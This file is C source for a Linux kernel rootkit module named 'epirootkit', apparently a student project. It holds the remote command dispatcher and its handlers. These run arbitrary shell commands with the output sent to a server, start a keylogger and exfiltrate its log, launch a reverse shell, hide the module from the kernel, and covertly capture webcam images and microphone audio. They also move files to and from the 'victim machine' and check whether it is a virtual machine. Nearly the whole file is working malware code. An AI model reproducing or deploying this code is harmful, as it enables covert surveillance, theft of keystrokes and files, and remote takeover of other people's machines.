#include <linux/delay.h>
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/utsname.h>
#include <linux/vmalloc.h>

#include "crypto.h"
#include "epirootkit.h"
#include "io.h"
#include "menu.h"
#include "passwd.h"
#include "sysinfo.h"
#include "upload.h"
#include "download.h"
#include "vanish.h"

extern struct socket *get_worker_socket(void);

// Handler prototypes
static int connect_handler(char *args);
static int disconnect_handler(char *args);
static int ping_handler(char *args);
static int change_password_handler(char *args);
static int exec_handler(char *args);
static int klgon_handler(char *args);
static int klgoff_handler(char *args);
static int klg_handler(char *args);
static int getshell_handler(char *args);
static int killcom_handler(char *args);
static int hide_module_handler(char *args);
static int unhide_module_handler(char *args);
static int help_handler(char *args);
static int start_webcam_handler(char *args);
static int capture_image_handler(char *args);
static int start_microphone_handler(char *args);
static int play_audio_handler(char *args);
static int sysinfo_handler(char *args);
static int is_in_vm_handler(char *args);

static struct command rootkit_commands_array[] = {
    { "connect", 7, "unlock access to rootkit. Usage: connect [password]", 51, connect_handler },
    { "disconnect", 10, "disconnect user", 15, disconnect_handler },
    { "ping", 4, "ping the rootkit", 16, ping_handler },
    { "passwd", 6, "change rootkit password. Usage: passwd NEW_PASSWORD", 51, change_password_handler },
    { "exec", 4, "execute a shell command. Usage: exec [-s for silent mode] [args*]", 65, exec_handler },
    { "klgon", 6, "activate keylogger", 18, klgon_handler },
    { "klgoff", 7, "deactivate keylogger", 20, klgoff_handler },
    { "klg", 3, "send keylogger content to server", 32, klg_handler },
    { "getshell", 8, "launch reverse shell", 20, getshell_handler },
    { "killcom", 7, "exit the module", 15, killcom_handler },
    { "hide_module", 11, "hide the module from the kernel", 31, hide_module_handler },
    { "unhide_module", 13, "unhide the module in the kernel", 31, unhide_module_handler },
    { "help", 4, "display this help message", 25, help_handler },
    { "start_webcam", 11, "activate webcam", 15, start_webcam_handler },
    { "capture_image", 13, "capture an image with the webcam", 32, capture_image_handler },
    { "start_microphone", 15, "start recording from microphone", 31, start_microphone_handler },
    { "play_audio", 10, "play an audio file", 18, play_audio_handler },
    { "hooks", 5, "manage hide/forbid/alter rules", 30, hooks_menu_handler },
    { "upload", 6, "receive a file and save it on disk", 34, upload_handler },
    { "download", 8, "download a file from victim machine", 35, download_handler },
    { "sysinfo", 7, "get system information in JSON format", 37, sysinfo_handler },
    { "is_in_vm", 8, "check if remote rootkit is running in vm", 40, is_in_vm_handler },
    { NULL, 0, NULL, 0, NULL }
};

static int is_in_vm_handler(char *args) {
    (void)args;

    if (is_running_in_virtual_env()) {
        send_to_server("[YES] The rootkit is running in a virtual machine.\n");
    }
    else {
        send_to_server("[NOP] The rootkit is not running in a virtual machine.\n");
    }

    return SUCCESS;
}

static int help_handler(char *args) {
    int i;
    char *help_msg = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
    int offset = snprintf(help_msg, STD_BUFFER_SIZE, "Available commands:\n");
    for (i = 0; rootkit_commands_array[i].cmd_name != NULL; i++) {
        offset += snprintf(help_msg + offset, STD_BUFFER_SIZE - offset, "\t -%s: %s\n",
                           rootkit_commands_array[i].cmd_name, rootkit_commands_array[i].cmd_desc);
        if (offset >= STD_BUFFER_SIZE) {
            ERR_MSG("help_handler: help message truncated\n");
            break;
        }
    }

    send_to_server(help_msg);

    kfree(help_msg);

    return 0;
}

int rootkit_command(char *command, unsigned command_size) {
    // Handle ongoing upload
    if (receiving_file) {
        DBG_MSG("rootkit_command: receiving upload chunk (%u bytes)\n", command_size);
        return handle_upload_chunk(command, command_size);
    }

    // Handle ongoing download
    if (download(command) == 0) {
        return 0;
    }

    // Strip trailing newline if present
    command[strcspn(command, "\n")] = '\0';

    // Validate null termination
    if (command[command_size - 1] != '\0') {
        ERR_MSG("rootkit_command: command is not null-terminated\n");
        return -EINVAL;
    }

    // Allow these commands without authentication
    const char *allowed_commands[] = { "connect", "help", "ping", NULL };

    if (!is_user_auth()) {
        int allowed = 0;
        for (int i = 0; allowed_commands[i] != NULL; i++) {
            if (strncmp(command, allowed_commands[i], strlen(allowed_commands[i])) == 0) {
                allowed = 1;
                break;
            }
        }

        if (!allowed) {
            send_to_server("Authentication required. Use the 'connect' command to authenticate.\n");
            ERR_MSG("rootkit_command: unauthorized command without authentication\n");
            return -FAILURE;
        }
    }

    // Match command against registered handlers
    for (int i = 0; rootkit_commands_array[i].cmd_name != NULL; i++) {
        if (strncmp(command, rootkit_commands_array[i].cmd_name,
                    rootkit_commands_array[i].cmd_name_size) == 0) {
            char *args = command + rootkit_commands_array[i].cmd_name_size;
            while (*args == ' ') args++;
            return rootkit_commands_array[i].cmd_handler(args);
        }
    }

    // Unknown command
    ERR_MSG("rootkit_command: unknown command \"%s\"\n", command);
    send_to_server("Unknown command\n");
    return -EINVAL;
}

static int change_password_handler(char *args) {
    if (!args || !*args) {
        send_to_server("Usage: passwd NEW_PASSWORD\n");
        return -EINVAL;
    }

    int ret = passwd_set(args);
    if (ret < 0) {
        ERR_MSG("change_password_handler: failed to set password: %d\n", ret);
        send_to_server("Failed to set password\n");
        return ret;
    }

    send_to_server("Password updated\n");
    return SUCCESS;
}

static int connect_handler(char *args) {
    if (is_user_auth()) {
        send_to_server("You are already authentificated.\n");
        return true;
    }

    DBG_MSG("connect_handler: verifying password received: %s...\n", args);

    int pv = passwd_verify(args);
    if (pv < 0) {
        ERR_MSG("connect_handler: error verifying password: %d\n", pv);
        return pv;
    }

    if (pv == 1) {
        set_user_auth(true);
        DBG_MSG("connect_handler: user authenticated\n");
        send_to_server("User authenticated.\n");
        return true;
    }
    else {
        set_user_auth(false);
        ERR_MSG("connect_handler: invalid password\n");
        send_to_server("Invalid password.\n");
        msleep(2 * TIMEOUT_BEFORE_RETRY);
        return false;
    }
}

static int disconnect_handler(char *args) {
    set_user_auth(false);
    send_to_server("User successfully disconnected.\n");
    return false;
}

static int ping_handler(char *args) {
    send_to_server("pong\n");
    return SUCCESS;
}

static int exec_handler(char *args) {
    bool catch_stds = true;

    // If first non whitespace character is '-s', set catch_stds to false
    args += strspn(args, " \t");
    if (strncmp(args, "-s ", 3) == 0) {
        catch_stds = false;
        args += 3; // Skip the '-s ' part
    }

    // Extract the command from the received message
    char *command = args;
    command[strcspn(command, "\n")] = '\0';
    DBG_MSG("exec_handler: executing command: %s\n", command);

    // Execute the command
    int ret_code = exec_str_as_command(command, catch_stds);
    if (ret_code < 0) {
        ERR_MSG("exec_handler: failed to execute command\n");
        return ret_code;
    }

    if (catch_stds) {
        char stdout_msg[] = "stdout:\n";
        int stdout_buff_size = 0;
        char *stdout_buff;
        stdout_buff_size = _read_file(STDOUT_FILE, &stdout_buff);

        char stderr_msg[] = "stderr:\n";
        int stderr_buff_size = 0;
        char *stderr_buff;
        stderr_buff_size = _read_file(STDERR_FILE, &stderr_buff);

        if (stdout_buff_size < 0 || stderr_buff_size < 0) {
            ERR_MSG("exec_handler: failed to read stdout or stderr files\n");
            send_to_server("Failed to read stdout or stderr files\n");
            if (stdout_buff)
                kfree(stdout_buff);
            if (stderr_buff)
                kfree(stderr_buff);
            return -EIO;
        }

        char code_msg[32] = { 0 };
        snprintf(code_msg, sizeof(code_msg), "Terminated with code: %d\n", ret_code);

        char *output_msg = kmalloc(stdout_buff_size + stderr_buff_size + sizeof(stdout_msg) + sizeof(stderr_msg) + sizeof(code_msg), GFP_KERNEL);
        if (!output_msg) {
            ERR_MSG("exec_handler: failed to allocate memory for output message\n");
            kfree(stdout_buff);
            kfree(stderr_buff);
            return -ENOMEM;
        }
        snprintf(output_msg, stdout_buff_size + stderr_buff_size + sizeof(stdout_msg) + sizeof(stderr_msg) + sizeof(code_msg),
                 "%s%s%s%s%s", stdout_msg, stdout_buff, stderr_msg, stderr_buff, code_msg);

        send_to_server(output_msg);
        kfree(output_msg);
        kfree(stdout_buff);
        kfree(stderr_buff);
    }

    return ret_code;
}

static int klgon_handler(char *args) {
    int ret_code = epikeylog_init(0);
    if (ret_code < 0) {
        ERR_MSG("klgon_handler: failed to activate keylogger\n");
        send_to_server("");
        return ret_code;
    }
    send_to_server("keylogger activated\n");
    DBG_MSG("klgon_handler: keylogger activated\n");
    return ret_code;
}

static int klgoff_handler(char *args) {
    int ret_code = epikeylog_exit();
    if (ret_code < 0) {
        ERR_MSG("klgoff_handler: failed to deactivate keylogger\n");
        send_to_server("");
        return ret_code;
    }
    send_to_server("keylogger desactivated\n");
    DBG_MSG("klgoff_handler: keylogger desactivated\n");
    return ret_code;
}

static int klg_handler(char *args) {
    int ret_code = epikeylog_send_to_server();
    if (ret_code < 0) {
        ERR_MSG("klg_handler: failed to send keylogger content\n");
        send_to_server("");
        return ret_code;
    }
    DBG_MSG("klg_handler: keylogger content sent\n");
    return ret_code;
}

static int getshell_handler(char *args) {
    // remove all trailing space in args
    args += strspn(args, " \t");
    args[strcspn(args, "\n")] = '\0';
    // check if all chars are numbers
    if (args[0] == '\0') {
        DBG_MSG("getshell_handler: no port specified, using default port %d\n", REVERSE_SHELL_PORT);
        args = "0";
    }
    long shellport = simple_strtol(args, NULL, 10);
    if (shellport < 0 || shellport > 65535) {
        ERR_MSG("getshell_handler: invalid port number %ld\n", shellport);
        send_to_server("Invalid port number\n");
        return -EINVAL;
    }

    // Lancer le reverse shell avec le port spécifié
    int ret_code = launch_reverse_shell(args);

    if (ret_code < 0) {
        ERR_MSG("getshell_handler: failed to launch reverse shell on port %ld\n", shellport);
        send_to_server("Failed to launch reverse shell\n");
    }

    else
        send_to_server("Reverse shell launched successfully on port %ld\n", shellport);

    return ret_code;
}

static int killcom_handler(char *args) {
    DBG_MSG("killcom_handler: killcom received, exiting...\n");

    // The module will be removed by the usermode helper
    static char *argv[] = { "/usr/sbin/rmmod", "epirootkit", NULL };
    static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };

    // Unhiding module...
    unhide_module();
    int ret_code = unhide_module();
    if (ret_code < 0) {
        ERR_MSG("unhide_module_handler: failed to unhide module\n");
        return ret_code;
    }

    DBG_MSG("killcom_handler: calling rmmod from usermode...\n");

    call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);

    return 0;
}

static int hide_module_handler(char *args) {
    DBG_MSG("hide_module_handler: hiding module\n");
    int ret_code = hide_module();
    if (ret_code < 0) {
        ERR_MSG("hide_module_handler: failed to hide module\n");
    }
    return ret_code;
}

static int unhide_module_handler(char *args) {
    DBG_MSG("unhide_module_handler: unhiding module\n");
    int ret_code = unhide_module();
    if (ret_code < 0) {
        ERR_MSG("unhide_module_handler: failed to unhide module\n");
    }
    return ret_code;
}

// Command to start the webcam and capture an image
static int start_webcam_handler(char *args) {
    DBG_MSG("start_webcam_handler: starting webcam to capture an image\n");
    static char *argv[] = { "/usr/bin/ffmpeg", "-f", "v4l2", "-i", "/dev/video0", "-t", "00:00:10", "-s", "640x480", "-f", "image2", "/tmp/capture.jpg", NULL };
    static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };

    int ret_code = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    if (ret_code < 0) {
        ERR_MSG("start_webcam_handler: failed to start webcam\n");
        return ret_code;
    }
    DBG_MSG("start_webcam_handler: webcam started successfully, image captured\n");
    send_to_server("Webcam activated and image captured\n");
    return SUCCESS;
}

// Command to capture an image from the webcam
static int capture_image_handler(char *args) {
    DBG_MSG("capture_image_handler: capturing an image from the webcam\n");
    static char *argv[] = { "/usr/bin/ffmpeg", "-f", "v4l2", "-i", "/dev/video0", "-t", "00:00:10", "-s", "640x480", "-f", "image2", "/tmp/capture.jpg", NULL };
    static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };

    int ret_code = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    if (ret_code < 0) {
        ERR_MSG("capture_image_handler: failed to capture image\n");
        return ret_code;
    }
    DBG_MSG("capture_image_handler: image captured successfully, saved at /tmp/capture.jpg\n");
    send_to_server("Captured image saved at /tmp/capture.jpg\n");

    /*
    // Copy the image to a directory accessible by Flask
    // For example, to /var/www/html/images/ on the server
    int copy_ret_code = system("cp /tmp/capture.jpg /var/www/html/images/capture.jpg");
    if (copy_ret_code < 0) {
        ERR_MSG("capture_image_handler: failed to copy image to web accessible directory\n");
        return copy_ret_code;
    }
    */
    return SUCCESS;
}

// Command to start recording from the microphone
static int start_microphone_handler(char *args) {
    DBG_MSG("start_microphone_handler: starting microphone recording\n");
    static char *argv[] = { "/usr/bin/arecord", "-D", "plughw:1,0", "-f", "cd", "-t", "wav", "-d", "10", "/tmp/audio.wav", NULL };
    static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };

    int ret_code = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    if (ret_code < 0) {
        ERR_MSG("start_microphone_handler: failed to start microphone\n");
        return ret_code;
    }
    DBG_MSG("start_microphone_handler: microphone recording started successfully, audio saved at /tmp/audio.wav\n");
    send_to_server("Microphone activated and audio recorded\n");
    return SUCCESS;
}

// Command to play an audio file
static int play_audio_handler(char *args) {
    DBG_MSG("play_audio_handler: playing audio file from /tmp/audio.wav\n");
    static char *argv[] = { "/usr/bin/aplay", "/tmp/audio.wav", NULL };
    static char *envp[] = { "HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };

    int ret_code = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    if (ret_code < 0) {
        ERR_MSG("play_audio_handler: failed to play audio\n");
        return ret_code;
    }
    DBG_MSG("play_audio_handler: audio played successfully\n");
    send_to_server("Audio played\n");
    return SUCCESS;
}

static int sysinfo_handler(char *args) {
    char *info = get_sysinfo();
    if (!info) {
        send_to_server("{error: Failed to retrieve system information}");
        return -ENOMEM;
    }

    send_to_server(info);
    kfree(info);
    return 0;
}
